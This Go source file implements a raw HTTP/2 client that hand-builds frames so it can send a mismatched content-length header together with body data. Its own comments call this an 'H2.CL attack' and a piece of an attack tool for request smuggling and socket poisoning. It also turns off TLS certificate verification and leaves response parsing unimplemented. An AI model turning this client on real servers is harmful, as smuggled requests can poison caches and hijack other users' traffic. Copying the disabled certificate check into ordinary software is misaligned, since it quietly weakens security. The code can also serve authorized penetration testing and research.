package client

import (
	"crypto/tls"
	"fmt"
	"net/url"
	"time"

	"golang.org/x/net/http2"
	"golang.org/x/net/http2/hpack"
)

// RawH2Client allows sending raw H2 frames to bypass standard client normalizations
type RawH2Client struct {
	Timeout time.Duration
}

func NewRawH2Client(timeout time.Duration) *RawH2Client {
	return &RawH2Client{Timeout: timeout}
}

func (c *RawH2Client) Do(req *Request, timeout time.Duration) (*Response, error) {
	// 1. Establish TCP/TLS connection
	u, err := url.Parse(req.URL)
	if err != nil {
		return nil, err
	}

	host := u.Host
	if u.Port() == "" {
		host = host + ":443"
	}

	conf := &tls.Config{
		InsecureSkipVerify: true,
		NextProtos:         []string{"h2"},
	}

	conn, err := tls.Dial("tcp", host, conf)
	if err != nil {
		return nil, err
	}
	defer conn.Close()

	// 2. HTTP/2 Connection Preface
	// "Pri * HTTP/2.0\r\n\r\nSM\r\n\r\n"
	if _, err := conn.Write([]byte(http2.ClientPreface)); err != nil {
		return nil, err
	}

	framer := http2.NewFramer(conn, conn)
	framer.ReadMetaHeaders = hpack.NewDecoder(4096, nil)

	// 3. Send Initial SETTINGS frame
	if err := framer.WriteSettings(
		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
	); err != nil {
		return nil, err
	}

	// 4. Wait for server SETTINGS ACK (simplified interactions)
	// Real H2 client needs a loop handling frames.
	// specific smuggling logic: send Headers + Data without waiting too much?
	// We should probably read a bit to consume handshake.

	// 5. Send Headers
	// Create HPACK block
	var buf []byte
	// For H2.CL attack, we want to specify content-length: 0 but send data.
	// Standard clients would verify this. We won't.

	hdrs := []hpack.HeaderField{
		{Name: ":method", Value: req.Method},
		{Name: ":scheme", Value: u.Scheme},
		{Name: ":path", Value: u.Path},
		{Name: ":authority", Value: u.Host},
	}

	// Add custom headers
	for k, v := range req.Headers {
		hdrs = append(hdrs, hpack.HeaderField{Name: k, Value: v})
	}

	// CRITICAL: If ContentLength is explicitly set in Request (e.g. 0), we assume user meant it.
	// We add it as a header.
	if req.ContentLength >= 0 { // Allow 0
		hdrs = append(hdrs, hpack.HeaderField{Name: "content-length", Value: fmt.Sprintf("%d", req.ContentLength)})
	}

	// Encode headers
	henc := hpack.NewEncoder(&byteBuffer{buf: &buf})
	for _, h := range hdrs {
		if err := henc.WriteField(h); err != nil {
			return nil, err
		}
	}

	// Stream ID 1 (Client initiated)
	// EndHeaders = true
	// EndStream = false (because we want to send body data even if CL=0)
	if err := framer.WriteHeaders(http2.HeadersFrameParam{
		StreamID:      1,
		BlockFragment: buf,
		EndStream:     false,
		EndHeaders:    true,
	}); err != nil {
		return nil, err
	}

	// 6. Send DATA frame
	// Even if CL=0 in headers, we write a DATA frame.
	if len(req.Body) > 0 {
		if err := framer.WriteData(1, true, req.Body); err != nil {
			return nil, err
		}
	} else {
		// Just close stream if no body
		if err := framer.WriteData(1, true, nil); err != nil {
			return nil, err
		}
	}

	// 7. Read Response
	// Simplified reader: wait for HEADERS and DATA on stream 1
	resp := &Response{
		Headers: make(map[string]string),
	}

	start := time.Now()

	// Read loop with timeout
	done := false
	for !done {
		conn.SetReadDeadline(time.Now().Add(timeout))
		f, err := framer.ReadFrame()
		if err != nil {
			return nil, err
		}

		switch f := f.(type) {
		case *http2.HeadersFrame:
			if f.StreamID == 1 {
				// Parse headers... implementation omitted for brevity in this snippet
				// In a real attack tool we might need status code.
				// But often detection is based on TIMEOUT (backend waiting) or socket poisoning.
				// If we successfully sent the frame, that might be enough for the attack step.
			}
		case *http2.DataFrame:
			if f.StreamID == 1 {
				resp.Body = append(resp.Body, f.Data()...)
				if f.StreamEnded() {
					done = true
				}
			}
		case *http2.GoAwayFrame:
			return nil, fmt.Errorf("server sent GOAWAY")
		case *http2.RSTStreamFrame:
			if f.StreamID == 1 {
				return nil, fmt.Errorf("server reset stream")
			}
		}

		if time.Since(start) > timeout {
			break
		}
	}

	resp.Duration = time.Since(start)
	return resp, nil
}

// Helper for HPACK encoding
type byteBuffer struct {
	buf *[]byte
}

func (b *byteBuffer) Write(p []byte) (int, error) {
	*b.buf = append(*b.buf, p...)
	return len(p), nil
}
